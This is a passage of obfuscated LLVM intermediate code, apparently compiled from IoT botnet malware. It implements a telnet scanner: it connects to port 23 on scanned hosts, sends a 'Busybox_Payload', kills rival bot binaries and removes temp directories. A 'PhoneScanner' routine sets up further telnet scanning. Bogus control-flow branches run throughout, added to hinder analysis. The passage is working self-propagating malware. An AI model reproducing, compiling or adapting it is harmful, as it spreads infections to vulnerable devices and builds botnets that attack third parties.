  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 4
  %1298 = load i8, i8* %1297, align 1
  %1299 = zext i8 %1298 to i32
  %1300 = icmp ne i32 %1299, 3
  %1301 = load i32, i32* @x.93
  %1302 = load i32, i32* @y.94
  %1303 = sub i32 %1301, 1
  %1304 = mul i32 %1301, %1303
  %1305 = urem i32 %1304, 2
  %1306 = icmp eq i32 %1305, 0
  %1307 = icmp slt i32 %1302, 10
  %1308 = or i1 %1306, %1307
  br i1 %1308, label %originalBBpart2151, label %originalBB149alteredBB

originalBBpart2151:                               ; preds = %originalBB149
  br i1 %1300, label %1309, label %1326

; <label>:1309:                                   ; preds = %originalBBpart2151
  %1310 = load i32, i32* @x.93
  %1311 = load i32, i32* @y.94
  %1312 = sub i32 %1310, 1
  %1313 = mul i32 %1310, %1312
  %1314 = urem i32 %1313, 2
  %1315 = icmp eq i32 %1314, 0
  %1316 = icmp slt i32 %1311, 10
  %1317 = or i1 %1315, %1316
  br i1 %1317, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %1309
  %1318 = load i32, i32* @x.93
  %1319 = load i32, i32* @y.94
  %1320 = sub i32 %1318, 1
  %1321 = mul i32 %1318, %1320
  %1322 = urem i32 %1321, 2
  %1323 = icmp eq i32 %1322, 0
  %1324 = icmp slt i32 %1319, 10
  %1325 = or i1 %1323, %1324
  br i1 %1325, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br label %1326

; <label>:1326:                                   ; preds = %originalBBpart2155, %originalBBpart2151
  %1327 = load i32, i32* %6, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1328
  call void @reset_telstate(%struct.telstate_t* %1329)
  br label %1330

; <label>:1330:                                   ; preds = %1326, %originalBBpart2147
  br label %1331

; <label>:1331:                                   ; preds = %1330, %originalBBpart2125, %1053, %896, %854, %originalBBpart293, %originalBBpart289, %561, %originalBBpart242, %138
  %1332 = load i32, i32* @x.93
  %1333 = load i32, i32* @y.94
  %1334 = sub i32 %1332, 1
  %1335 = mul i32 %1332, %1334
  %1336 = urem i32 %1335, 2
  %1337 = icmp eq i32 %1336, 0
  %1338 = icmp slt i32 %1333, 10
  %1339 = or i1 %1337, %1338
  br i1 %1339, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %1331
  %1340 = load i32, i32* @x.93
  %1341 = load i32, i32* @y.94
  %1342 = sub i32 %1340, 1
  %1343 = mul i32 %1340, %1342
  %1344 = urem i32 %1343, 2
  %1345 = icmp eq i32 %1344, 0
  %1346 = icmp slt i32 %1341, 10
  %1347 = or i1 %1345, %1346
  br i1 %1347, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %1348

; <label>:1348:                                   ; preds = %originalBBpart2159, %originalBBpart2141, %1100, %1067, %1038, %892, %880, %originalBBpart2101, %731, %719, %originalBBpart281, %526, %506, %293, %246
  %1349 = load i32, i32* %6, align 4
  %1350 = add nsw i32 %1349, 1
  store i32 %1350, i32* %6, align 4
  br label %120

; <label>:1351:                                   ; preds = %120
  %1352 = load i32, i32* @x.93
  %1353 = load i32, i32* @y.94
  %1354 = sub i32 %1352, 1
  %1355 = mul i32 %1352, %1354
  %1356 = urem i32 %1355, 2
  %1357 = icmp eq i32 %1356, 0
  %1358 = icmp slt i32 %1353, 10
  %1359 = or i1 %1357, %1358
  br i1 %1359, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %1351
  %1360 = load i32, i32* @x.93
  %1361 = load i32, i32* @y.94
  %1362 = sub i32 %1360, 1
  %1363 = mul i32 %1360, %1362
  %1364 = urem i32 %1363, 2
  %1365 = icmp eq i32 %1364, 0
  %1366 = icmp slt i32 %1361, 10
  %1367 = or i1 %1365, %1366
  br i1 %1367, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br label %102
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  %1369 = load i32, i32* %4, align 4
  store i32 %1369, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %64
  %1370 = load i32, i32* %6, align 4
  %1371 = load i32, i32* %5, align 4
  %1372 = icmp slt i32 %1370, %1371
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  store i32 0, i32* %6, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  %1373 = load i32, i32* %6, align 4
  %1374 = sext i32 %1373 to i64
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1374
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1375, i32 0, i32 4
  %1377 = load i8, i8* %1376, align 1
  %1378 = zext i8 %1377 to i32
  %1379 = icmp eq i32 %1378, 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %217
  %1380 = load i32, i32* %6, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 4
  store i8 1, i8* %1383, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %251
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %294
  %1384 = load i32, i32* %6, align 4
  %1385 = sext i32 %1384 to i64
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1385
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1386, i32 0, i32 0
  %1388 = load i32, i32* %1387, align 8
  %1389 = load i32, i32* %6, align 4
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 0
  %1393 = load i32, i32* %1392, align 8
  %1394 = call i32 (i32, i32, ...) @fcntl(i32 %1393, i32 3, i8* null)
  %_ = shl i32 %1394, 2048
  %_23 = sub i32 %1394, 2048
  %gen = mul i32 %_23, 2048
  %_24 = shl i32 %1394, 2048
  %_25 = sub i32 %1394, 2048
  %gen26 = mul i32 %_25, 2048
  %_27 = sub i32 0, %1394
  %gen28 = add i32 %_27, 2048
  %_29 = sub i32 0, %1394
  %gen30 = add i32 %_29, 2048
  %_31 = sub i32 0, %1394
  %gen32 = add i32 %_31, 2048
  %1395 = or i32 %1394, 2048
  %1396 = call i32 (i32, i32, ...) @fcntl(i32 %1388, i32 4, i32 %1395)
  %1397 = load i32, i32* %6, align 4
  %1398 = sext i32 %1397 to i64
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1398
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1399, i32 0, i32 0
  %1401 = load i32, i32* %1400, align 8
  %1402 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %1403 = call i32 @connect(i32 %1401, %struct.sockaddr* %1402, i32 16)
  %1404 = icmp eq i32 %1403, -1
  br label %originalBB22

originalBB36alteredBB:                            ; preds = %originalBB36, %340
  %1405 = load i32, i32* %6, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1406
  call void @advance_telstate(%struct.telstate_t* %1407, i32 1)
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %360
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %377
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %403
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %453
  %1408 = call i64 @time(i64* null) #5
  %1409 = trunc i64 %1408 to i32
  %1410 = load i32, i32* %6, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 9
  store i32 %1409, i32* %1413, align 8
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %1414 = load i32, i32* %6, align 4
  %1415 = sext i32 %1414 to i64
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1415
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1416, i32 0, i32 0
  %1418 = load i32, i32* %1417, align 8
  %1419 = bitcast i32* %15 to i8*
  %1420 = call i32 @getsockopt(i32 %1418, i32 1, i32 4, i8* %1419, i32* %14) #5
  %1421 = load i32, i32* %15, align 4
  %1422 = icmp ne i32 %1421, 0
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %507
  %1423 = load i32, i32* %7, align 4
  %1424 = icmp eq i32 %1423, -1
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %531
  %1425 = load i32, i32* %6, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 9
  %1429 = load i32, i32* %1428, align 8
  %_61 = shl i32 %1429, 7
  %_62 = sub i32 0, %1429
  %gen63 = add i32 %_62, 7
  %_64 = sub i32 0, %1429
  %gen65 = add i32 %_64, 7
  %_66 = shl i32 %1429, 7
  %_67 = shl i32 %1429, 7
  %1430 = add i32 %1429, 7
  %1431 = zext i32 %1430 to i64
  %1432 = call i64 @time(i64* null) #5
  %1433 = icmp slt i64 %1431, %1432
  br label %originalBB60

originalBB71alteredBB:                            ; preds = %originalBB71, %576
  %1434 = call i64 @time(i64* null) #5
  %1435 = trunc i64 %1434 to i32
  %1436 = load i32, i32* %6, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 9
  store i32 %1435, i32* %1439, align 8
  %1440 = load i32, i32* %6, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 11
  %1444 = load i8*, i8** %1443, align 8
  %1445 = call i32 @contains_fail(i8* %1444)
  %1446 = icmp ne i32 %1445, 0
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %610
  %1447 = load i32, i32* %6, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1448
  call void @advance_telstate(%struct.telstate_t* %1449, i32 3)
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %630
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %657
  %1450 = load i32, i32* %6, align 4
  %1451 = sext i32 %1450 to i64
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1451
  call void @reset_telstate(%struct.telstate_t* %1452)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %677
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %735
  %1453 = load i32, i32* %6, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1454
  call void @advance_telstate(%struct.telstate_t* %1455, i32 4)
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %787
  %1456 = load i32, i32* %6, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1457
  call void @advance_telstate(%struct.telstate_t* %1458, i32 5)
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %807
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %824
  %1459 = load i32, i32* %6, align 4
  %1460 = sext i32 %1459 to i64
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1460
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1461, i32 0, i32 9
  %1463 = load i32, i32* %1462, align 8
  %_104 = sub i32 0, %1463
  %gen105 = add i32 %_104, 7
  %_106 = sub i32 %1463, 7
  %gen107 = mul i32 %_106, 7
  %1464 = add i32 %1463, 7
  %1465 = zext i32 %1464 to i64
  %1466 = call i64 @time(i64* null) #5
  %1467 = icmp slt i64 %1465, %1466
  br label %originalBB103

originalBB111alteredBB:                           ; preds = %originalBB111, %948
  %1468 = load i32, i32* %6, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1469
  call void @advance_telstate(%struct.telstate_t* %1470, i32 7)
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %1016
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %1071
  call void @RemoveTempDirs()
  %1471 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1472 = call i32 (i8*, i8*, ...) @sprintf(i8* %1471, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.869, i32 0, i32 0), i8** getelementptr inbounds ([347 x i8*], [347 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([347 x i8*], [347 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1473 = load i32, i32* %6, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1474
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1475, i32 0, i32 0
  %1477 = load i32, i32* %1476, align 8
  %1478 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1479 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1480 = call i64 @strlen(i8* %1479) #9
  %1481 = call i64 @send(i32 %1477, i8* %1478, i64 %1480, i32 16384)
  %1482 = icmp slt i64 %1481, 0
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %1104
  %1483 = load i32, i32* %6, align 4
  %1484 = sext i32 %1483 to i64
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1484
  call void @advance_telstate(%struct.telstate_t* %1485, i32 8)
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %1138
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %1163
  br label %originalBB131

originalBB135alteredBB:                           ; preds = %originalBB135, %1180
  %1486 = load i32, i32* %6, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 0
  %1490 = load i32, i32* %1489, align 8
  %1491 = load i8*, i8** @Busybox_Payload, align 8
  %1492 = load i8*, i8** @Busybox_Payload, align 8
  %1493 = call i64 @strlen(i8* %1492) #9
  %1494 = call i64 @send(i32 %1490, i8* %1491, i64 %1493, i32 16384)
  %1495 = icmp slt i64 %1494, 0
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %1207
  %1496 = load i32, i32* %6, align 4
  %1497 = sext i32 %1496 to i64
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1497
  call void @reset_telstate(%struct.telstate_t* %1498)
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %1259
  %1499 = load i32, i32* %6, align 4
  %1500 = sext i32 %1499 to i64
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1500
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1501, i32 0, i32 9
  %1503 = load i32, i32* %1502, align 8
  %_144 = sub i32 0, %1503
  %gen145 = add i32 %_144, 60
  %1504 = add i32 %1503, 60
  %1505 = zext i32 %1504 to i64
  %1506 = call i64 @time(i64* null) #5
  %1507 = icmp slt i64 %1505, %1506
  br label %originalBB143

originalBB149alteredBB:                           ; preds = %originalBB149, %1285
  %1508 = load i32, i32* %6, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 4
  %1512 = load i8, i8* %1511, align 1
  %1513 = zext i8 %1512 to i32
  %1514 = icmp ne i32 %1513, 3
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %1309
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %1331
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %1351
  br label %originalBB161
}

; Function Attrs: noinline nounwind uwtable
define void @PhoneScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [128 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca %struct.fd_set, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i32, align 4
  %12 = alloca [253 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 253, i32* %1, align 4
  %19 = load i32, i32* %1, align 4
  store i32 %19, i32* %6, align 4
  %20 = call i64 @time(i64* null) #5
  %21 = call i32 @rand_cmwc()
  %22 = zext i32 %21 to i64
  %23 = xor i64 %20, %22
  %24 = trunc i64 %23 to i32
  call void @srand(i32 %24) #5
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 zeroext 23) #10
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 8, i32 4, i1 false)
  %30 = call noalias i8* @malloc(i64 254) #5
  store i8* %30, i8** %13, align 8
  %31 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 254, i32 1, i1 false)
  %32 = load i32, i32* %6, align 4
  %33 = zext i32 %32 to i64
  %34 = call i8* @llvm.stacksave()
  store i8* %34, i8** %15, align 8
  %35 = alloca %struct.telstate_t, i64 %33, align 16
  %36 = bitcast %struct.telstate_t* %35 to i8*
  %37 = load i32, i32* %6, align 4
  %38 = sext i32 %37 to i64
  %39 = mul i64 %38, 5
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 %39, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2, %0
  %41 = load i32, i32* %2, align 4
  %42 = load i32, i32* %6, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %77

; <label>:44:                                     ; preds = %40
  %45 = load i32, i32* %2, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %46
  %48 = bitcast %struct.telstate_t* %47 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 40, i32 8, i1 false)
  %49 = load i32, i32* %2, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %50
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i32 0, i32 4
  store i8 1, i8* %52, align 1
  %53 = load i8*, i8** %13, align 8
  %54 = load i32, i32* %2, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %55
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %56, i32 0, i32 11
  store i8* %53, i8** %57, align 8
  br label %58

; <label>:58:                                     ; preds = %44
  %59 = load i32, i32* @x.95
  %60 = load i32, i32* @y.96
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* %2, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %2, align 4
  %69 = load i32, i32* @x.95
  %70 = load i32, i32* @y.96
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:77:                                     ; preds = %40
  %78 = load i32, i32* @x.95
  %79 = load i32, i32* @y.96
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %77
  %86 = load i32, i32* @x.95
  %87 = load i32, i32* @y.96
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br label %94

; <label>:94:                                     ; preds = %1372, %originalBBpart24
  %95 = load i32, i32* @x.95
  %96 = load i32, i32* @y.96
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* @x.95
  %104 = load i32, i32* @y.96
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %111

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = load i32, i32* @x.95
  %113 = load i32, i32* @y.96
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  store i32 0, i32* %2, align 4
  %120 = load i32, i32* @x.95
  %121 = load i32, i32* @y.96
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %128

; <label>:128:                                    ; preds = %originalBBpart2215, %originalBBpart212
  %129 = load i32, i32* @x.95
  %130 = load i32, i32* @y.96
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %128
  %137 = load i32, i32* %2, align 4
  %138 = load i32, i32* %6, align 4
  %139 = icmp slt i32 %137, %138
  %140 = load i32, i32* @x.95
  %141 = load i32, i32* @y.96
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %139, label %148, label %1372

; <label>:148:                                    ; preds = %originalBBpart216
  %149 = load i32, i32* %2, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 9
  %153 = load i32, i32* %152, align 8
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %162

; <label>:155:                                    ; preds = %148
  %156 = call i64 @time(i64* null) #5
  %157 = trunc i64 %156 to i32
  %158 = load i32, i32* %2, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 9
  store i32 %157, i32* %161, align 8
  br label %162

; <label>:162:                                    ; preds = %155, %148
  %163 = load i32, i32* %2, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 3
  %167 = load i8, i8* %166, align 4
  %168 = zext i8 %167 to i32
  switch i32 %168, label %1352 [
    i32 0, label %169
    i32 1, label %333
    i32 2, label %589
    i32 3, label %673
    i32 4, label %727
    i32 5, label %843
    i32 6, label %865
    i32 7, label %1047
    i32 8, label %1085
    i32 9, label %1201
    i32 10, label %1239
  ]

; <label>:169:                                    ; preds = %162
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 4
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 1
  br i1 %176, label %177, label %213

; <label>:177:                                    ; preds = %169
  %178 = load i32, i32* @x.95
  %179 = load i32, i32* @y.96
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %177
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 11
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %16, align 8
  %191 = load i32, i32* %2, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %192
  %194 = bitcast %struct.telstate_t* %193 to i8*
  call void @llvm.memset.p0i8.i64(i8* %194, i8 0, i64 40, i32 8, i1 false)
  %195 = load i8*, i8** %16, align 8
  %196 = load i32, i32* %2, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 11
  store i8* %195, i8** %199, align 8
  %200 = call i32 @PhoneScan()
  %201 = load i32, i32* %2, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 2
  store i32 %200, i32* %204, align 8
  %205 = load i32, i32* @x.95
  %206 = load i32, i32* @y.96
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %213

; <label>:213:                                    ; preds = %originalBBpart220, %169
  %214 = load i32, i32* @x.95
  %215 = load i32, i32* @y.96
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %213
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %222, align 4
  %223 = call zeroext i16 @htons(i16 zeroext 23) #10
